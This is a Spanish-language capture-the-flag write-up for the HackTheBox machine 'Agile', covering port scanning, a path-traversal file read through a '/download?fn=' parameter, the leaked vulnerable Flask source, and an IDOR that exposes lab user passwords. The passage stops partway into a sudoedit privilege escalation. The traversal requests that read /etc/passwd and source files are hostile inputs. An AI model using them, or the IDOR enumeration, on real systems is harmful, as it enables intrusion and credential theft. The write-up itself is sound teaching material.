<!DOCTYPE html> <html> <head> <meta charset="utf-8"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"> <title>HackTheBox Agile - LFI, IDOR y sudoedit &#8211; c4rta</title> <meta name="description" content="Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR"> <meta name="keywords" content="HTB, LFI, IDOR"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="avatar.jpg"> <meta name="twitter:title" content="HackTheBox Agile - LFI, IDOR y sudoedit"> <meta name="twitter:description" content="Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR"> <meta name="twitter:site" content="@_c4rta_"> <meta name="twitter:creator" content="@_c4rta_"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="HackTheBox Agile - LFI, IDOR y sudoedit"> <meta property="og:description" content="Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR"> <meta property="og:url" content="http://localhost:4000/htb-agile/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/images/avatar.jpg"> <link rel="canonical" href="http://localhost:4000/htb-agile/"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Feed --> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="" /> <!-- Favicons --> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- CSS --> <link rel="stylesheet" type="text/css" href="http://localhost:4000/assets/css/main.css"> <!-- Left Block Image for Posts --> <style type="text/css"> #posts.inner-post-page .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/assets/img/fondo6.jpg) no-repeat;background-size: cover;} </style> <!-- Left Block Images for Home and Pages --> <style type="text/css"> #posts .block-left {background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url(http://localhost:4000/assets/img/fondo2.gif) no-repeat;background-size: cover, cover;} .block-left {background: linear-gradient(rgba(44,45,51,0.9), rgba(44,45,51,0.9)), url(http://localhost:4000/assets/img/fondo3.jpg) no-repeat;background-size: cover;} </style> </head> <body id="posts" class="inner-post-page"> <div class="block-left"> <div class="content"> <a href="http://localhost:4000" class="logo"><img src="http://localhost:4000/images/avatar.jpg"></a> <div class="post-title-section"> <div class="section-line">Posts <em>/</em></div> <h1 class="section-title">HackTheBox Agile - LFI, IDOR y sudoedit </h1> <ul class="tags"> <li><a href="http://localhost:4000/tags#HTB">HTB</a></li> <li><a href="http://localhost:4000/tags#LFI">LFI</a></li> <li><a href="http://localhost:4000/tags#IDOR">IDOR</a></li> </ul> <div class="section-line reverse"><a href="http://localhost:4000/posts">Back to posts</a> <em>/</em></div> </div> </div> </div> <div class="block-right"> <div class="share-buttons"> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/htb-agile/" class="btn btn_twitter" title="Share on Twitter"><i class="fa fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/htb-agile/" class="btn btn_facebook" title="Share on Facebook"><i class="fa fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a> <a href="https://plus.google.com/share?url=http://localhost:4000/htb-agile/" class="btn btn_google-plus" title="Share on Google Plus"><i class="fa fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a> </div> <a href="../posts.html" title="posts" class="posts-menu-icon"></a> <a title="projects" class="projects-menu-icon"> <span></span> </a> <div class="inner-post content"> <div class="date-highlight">25 Jul 2023</div> <p class="lead">Tenemos un sitio web que sirve como vaul de contraseñas donde descubriremos que es vulnerable a LFI a la hora de exportar las contraseñas, ese mismo LFI lo aprovecharemos para filtrar un archivo de la aplicacion mediante un error de incluir una ruta que no existe, despues mediante IDOR vamos a poder ver las credenciales del usuario corum, despues haremos port forwarding para traernos un puerto y descubriremos el mismo sitio web donde obtendremos las credenciales de edwards, y para la escalada nos aprovecharemos de una vulnerabilidad de sudoedit mediante la variable de entorno EDITOR</p> <h2 id="enumeracion">Enumeracion</h2> <p>Iniciamos con un escaneo de nmap con:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-T4</span> <span class="nt">--open</span> <span class="nt">-p-</span> 10.10.11.203
</code></pre></div></div> <ul> <li> <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p> </li> <li> <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p> </li> <li> <p>Pn: para evitar el descubrimiento de hosts</p> </li> <li> <p>open: para que solo muestre los puertos abiertos</p> </li> <li> <p>-p-: para que escanee todo el rango de puertos</p> </li> </ul> <p>Y nos reporto dos puertos abiertos 22(SSH) y 80(HTTP)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div> <p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.203 
</code></pre></div></div> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Did not follow redirect to http://superpass.htb
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div> <p>Obtenemos que estamos contra un Ubuntu, el servidor web que usa en nginx y el http-title nos dice que nos esta redireccionado a un dominio: <code class="highlighter-rouge">http-title: Did not follow redirect to http://superpass.htb</code>, asi que lo agregamos el etc/hosts</p> <h3 id="investigando-el-sitio-web">Investigando el sitio web</h3> <p>El sitio web parace ser un administrador de contraseñas con el nombre <code class="highlighter-rouge">SuperPassword</code>, si le damos en el apartado de login nos mandara a un panel de inicio de sesion y registro</p> <p><img src="/assets/img/agile/1.png" alt="" /></p> <p>Si intentamos evadir el login con SQLi no va por ahi, asi que simplemente nos registraremos, vemos como nos muestra un vaul de contraseñas donde podemos agregarlas y exportarlas</p> <p><img src="/assets/img/agile/3.png" alt="" /></p> <p>Si le damos en exportar veremos que nos descarga un archivo .csv</p> <h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2> <p>Si interceptamos la peticion cuando le damos en exportar archivo podemos ver que en el parametro <code class="highlighter-rouge">download</code> se esta incluyendo el archivo csv</p> <p><img src="/assets/img/agile/4.png" alt="" /></p> <p>Por la menera en la que lo esta haciendo podriamos pensar en un LFI, asi que probaremos</p> <p>Si lo hacemos directamente indicandole el archivo de esta manera no vamos a poder</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download?fn<span class="o">=</span>/etc/passwd HTTP/1.1
</code></pre></div></div> <p>Nos dira que el archivo o directorio no se existe:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p</span> <span class="na">class=</span><span class="s">"errormsg"</span><span class="nt">&gt;</span>FileNotFoundError: [Errno 2] No such file or directory: <span class="ni">&amp;#39;</span>/tmp/etc/passwd<span class="ni">&amp;#39;</span><span class="nt">&lt;/p&gt;</span>
</code></pre></div></div> <p>Asi que usaremos directory path traversal de esta forma:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download?fn<span class="o">=</span>../../../../etc/passwd HTTP/1.1
</code></pre></div></div> <p>Y ya nos muestra el contenido del archivo y tambien podemos ver que existe el usuario <code class="highlighter-rouge">corum</code>, <code class="highlighter-rouge">runner</code> y <code class="highlighter-rouge">edwards</code></p> <p><img src="/assets/img/agile/5.png" alt="" /></p> <p>Despues de probar algunas cosas me decidi volver a probar esto pero esta vez, ver mas a detalle los errores:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download?fn<span class="o">=</span>/etc/passwd HTTP/1.1
</code></pre></div></div> <p>Antes veiamos que si tratabamos de indicarle de esa forma el /etc/passwd nos daba un error, pues cuando ocasiona ese error tambien se filtran rutas de la aplicacion</p> <p><img src="/assets/img/agile/6.png" alt="" /></p> <p>Asi que me di cuenta que a indicarle una ruta que no existe nos filtra informacion de la aplicacion, como se ve en este otro caso que le indice esto:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download?fn<span class="o">=</span>../../nose HTTP/1.1
</code></pre></div></div> <p><img src="/assets/img/agile/7.png" alt="" /></p> <p>Despues de ver un rato, un archivo interesante es este <code class="highlighter-rouge">/app/app/superpass/views/vault_views.py</code></p> <p>Vamos a mostrar su contenido de esta forma:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /download?fn<span class="o">=</span>../../../app/app/superpass/views/vault_views.py 
</code></pre></div></div> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">flask</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">from</span> <span class="nn">flask_login</span> <span class="kn">import</span> <span class="n">login_required</span><span class="p">,</span> <span class="n">current_user</span>
<span class="kn">from</span> <span class="nn">superpass.infrastructure.view_modifiers</span> <span class="kn">import</span> <span class="n">response</span>
<span class="kn">import</span> <span class="nn">superpass.services.password_service</span> <span class="k">as</span> <span class="n">password_service</span>
<span class="kn">from</span> <span class="nn">superpass.services.utility_service</span> <span class="kn">import</span> <span class="n">get_random</span>
<span class="kn">from</span> <span class="nn">superpass.data.password</span> <span class="kn">import</span> <span class="n">Password</span>


<span class="n">blueprint</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">Blueprint</span><span class="p">(</span><span class="s">'vault'</span><span class="p">,</span> <span class="n">__name__</span><span class="p">,</span> <span class="n">template_folder</span><span class="o">=</span><span class="s">'templates'</span><span class="p">)</span>


<span class="nd">@blueprint.route</span><span class="p">(</span><span class="s">'/vault'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/vault.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">vault</span><span class="p">():</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">get_passwords_for_user</span><span class="p">(</span><span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{passwords=}'</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s">'passwords'</span><span class="p">:</span> <span class="n">passwords</span><span class="p">}</span>


<span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/vault/add_row'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row_editable.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">add_row</span><span class="p">():</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">Password</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">get_random</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">p</span><span class="p">}</span>


<span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/vault/edit_row/&lt;id&gt;'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row_editable.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">get_edit_row</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">get_password_by_id</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>


<span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/vault/row/&lt;id&gt;'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">get_row</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">get_password_by_id</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>


<span class="nd">@blueprint.post</span><span class="p">(</span><span class="s">'/vault/add_row'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">add_row_post</span><span class="p">():</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span>
    <span class="n">site</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'url'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">site</span> <span class="ow">or</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="p">):</span>
        <span class="k">return</span> <span class="s">''</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">add_password</span><span class="p">(</span><span class="n">site</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">render_template</span><span class="p">(</span><span class="s">'vault/partials/password_row.html'</span><span class="p">,</span> <span class="n">p</span><span class="o">=</span><span class="n">p</span><span class="p">)</span>


<span class="nd">@blueprint.post</span><span class="p">(</span><span class="s">'/vault/update/&lt;id&gt;'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">update</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span>
    <span class="n">site</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'url'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'username'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'password'</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="n">site</span> <span class="ow">or</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">password</span><span class="p">):</span>
        <span class="n">flask</span><span class="o">.</span><span class="n">abort</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>

    <span class="n">p</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">update_password</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">site</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">p</span><span class="p">}</span>


<span class="nd">@blueprint.delete</span><span class="p">(</span><span class="s">'/vault/delete/&lt;id&gt;'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">password_service</span><span class="o">.</span><span class="n">delete_password</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span>


<span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/vault/export'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">export</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">current_user</span><span class="o">.</span><span class="n">has_passwords</span><span class="p">:</span>        
        <span class="n">fn</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">generate_csv</span><span class="p">(</span><span class="n">current_user</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">flask</span><span class="o">.</span><span class="n">redirect</span><span class="p">(</span><span class="n">f</span><span class="s">'/download?fn={fn}'</span><span class="p">,</span> <span class="mi">302</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"No passwords for user"</span>
    

<span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/download'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">download</span><span class="p">():</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">request</span>
    <span class="n">fn</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'fn'</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">f</span><span class="s">'/tmp/{fn}'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">flask</span><span class="o">.</span><span class="n">make_response</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
    <span class="n">resp</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Disposition'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'attachment; filename=superpass_export.csv'</span>
    <span class="n">resp</span><span class="o">.</span><span class="n">mimetype</span> <span class="o">=</span> <span class="s">'text/csv'</span>
    <span class="k">return</span> <span class="n">resp</span>
</code></pre></div></div> <h2 id="idor">IDOR</h2> <p>Basicamente IDOR es una vulnerabilidad en la cual el atacante puede acceder directamente a objetos (funciones, archivos, datos, etc) de acuerdo al input que haya ingresado. Vamos a analizar el codigo y te dire por que este sitio web es vulnerable</p> <p>Observa que cuando se accede a la ruta <code class="highlighter-rouge">/vault</code> se manda a llamar a la funcion <code class="highlighter-rouge">vault</code></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@blueprint.route</span><span class="p">(</span><span class="s">'/vault'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/vault.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">vault</span><span class="p">():</span>
    <span class="n">passwords</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">get_passwords_for_user</span><span class="p">(</span><span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s">'{passwords=}'</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span><span class="s">'passwords'</span><span class="p">:</span> <span class="n">passwords</span><span class="p">}</span>
</code></pre></div></div> <p>Esta funcion lo que hace es obtener las contraseñas de acuerdo al ID, se usa <code class="highlighter-rouge">get_passwords_for_user</code> para obtener las credenciales del usuario, y observa que recibe este parametro <code class="highlighter-rouge">current_user.id</code>, lo que significa que obtiene el ID del usuario actual que esta autenticado, y despues esas contraseñas las manda a imprimir en el <code class="highlighter-rouge">print</code></p> <p>La parte interesante esta en esta funcion:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@blueprint.get</span><span class="p">(</span><span class="s">'/vault/row/&lt;id&gt;'</span><span class="p">)</span>
<span class="nd">@response</span><span class="p">(</span><span class="n">template_file</span><span class="o">=</span><span class="s">'vault/partials/password_row.html'</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">get_row</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">password_service</span><span class="o">.</span><span class="n">get_password_by_id</span><span class="p">(</span><span class="nb">id</span><span class="p">,</span> <span class="n">current_user</span><span class="o">.</span><span class="nb">id</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span><span class="s">"p"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
</code></pre></div></div> <p>Observa que ahora se le pasa esta ruta <code class="highlighter-rouge">/vault/row/&lt;id&gt;</code> la cual recibe un ID, y en caso de proporcionarle un ID y toda esa ruta sea correcta entonces se manda a llamar a <code class="highlighter-rouge">get_row</code> la cual recibe un ID, el cual es el que se le pasa por la URL y lo que estaria pasando en la funcion <code class="highlighter-rouge">get_row</code> es obtener la contraseña del usuario asociado a ese ID.</p> <p>¿Entonces por que es vulnerable?, cuando ingresamos a la URL <code class="highlighter-rouge">http://superpass.htb/vault/row/</code> indicandole un ID valido al final, nos mostrara las credenciales de un usuario como se ve aca</p> <p><img src="/assets/img/agile/8.png" alt="" /></p> <p>Entonces lo que esta pasando es que podemos acceder directamente al objeto que tiene las contraseñas de acuerdo a nuestro input, el cual es el ID, y por eso es vulneable a IDOR, ahora, para saber cual ID es valido o no, puedes crear un diccionario de IDs y luego usar WFUZZ o gobuster para fuzzer por los ID, tambien puedes crearte un script de python que vaya probando los ID, o lo puedes hacer manual, simplemente en la URL le vas cambiando el ID y si cuela cuela, y bueno, te adelando que despues de fuzzear, encontre las credenciales de un usuario llamado corum con el ID 7</p> <ul> <li>usr: corum</li> <li>pass: 5db7caa1d13cc37c9fc2</li> </ul> <p>Ingresamos por SSH y ya somos curum y tenemos la flag de user</p> <p><img src="/assets/img/agile/9.png" alt="" /></p> <h2 id="corum-a-edwards">Corum a Edwards</h2> <p>Si ponemos el comando <code class="highlighter-rouge">sudo -l</code> para ver que podemos ejecutar como root, nos mostrara que no podemos ejecutar nada como root:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>corum@agile:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>corum: 
Sorry, user corum may not run <span class="nb">sudo </span>on agile.
</code></pre></div></div> <p>Si mostramos los puertos abiertos y conexiones establecidas con el comando <code class="highlighter-rouge">netstat -a</code> vamos a ver puertos interesantes</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:5555          0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:53409         0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:33060         0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 0.0.0.0:http            0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:5000          0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:41829         0.0.0.0:<span class="k">*</span>               LISTEN     
tcp        0      0 localhost:39900         localhost:53409         ESTABLISHED
tcp      150      0 localhost:46212         localhost:mysql         CLOSE_WAIT 
tcp      150      0 localhost:57136         localhost:mysql         CLOSE_WAIT 
tcp        0      0 localhost:48964         localhost:41829         ESTABLISHED
tcp        0      0 localhost:48972         localhost:41829         ESTABLISHED
tcp        0      0 localhost:53409         localhost:39900         ESTABLISHED
</code></pre></div></div> <p>El puerto 5555, 5000 y 41829, asi que podriamos hacer por forwarding para traernos uno de esos puertos, pero antes de eso decidi mostrar el <code class="highlighter-rouge">/etc/hosts</code> para ver si hay algo mas, y vamos a poder ver cosas:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>corum@agile:~<span class="nv">$ </span><span class="nb">cat</span> /etc/hosts
127.0.0.1 localhost superpass.htb test.superpass.htb
127.0.1.1 agile
</code></pre></div></div> <p>Tenemos el dominio <code class="highlighter-rouge">superpass.htb</code> y el subdominio <code class="highlighter-rouge">test.superpass.htb</code>, sabiendo eso ya podemos hacer port forwarding del puerto 5555</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 8080:127.0.0.1:5555 corum@superpass.htb
</code></pre></div></div> <p>Despues en mi archivo /etc/hosts agrege los dominio que descubrimos, de esta forma</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1  superpass.htb test.superpass.htb
</code></pre></div></div> <p>Al entrar el sitio web nos podemos dar cuenta que es lo mismo que el anterior sitio web</p> <p><img src="/assets/img/agile/10.png" alt="" /></p> <p>Aqui simplemente fue por intuicion, si es el mismo sitio web, entonces puedo probar el mismo IDOR para ver si hay credenciales de otro usuario, y en efecto, ahora en el ID 1 encontre las credenciales de <code class="highlighter-rouge">edwards</code>: <code class="highlighter-rouge">http://test.superpass.htb:8080/vault/row/1</code></p> <ul> <li>usr: edwards</li> <li>pass: d07867c6267dcb5df0af</li> </ul> <h2 id="escalada">Escalada</h2> <p>Si usamos <code class="highlighter-rouge">sudo -l</code> veremos que podemos ejecutar como <code class="highlighter-rouge">dev_admin</code> el comando <code class="highlighter-rouge">sudoedit</code> sobre dos archivos</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>edwards@agile:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>edwards: 
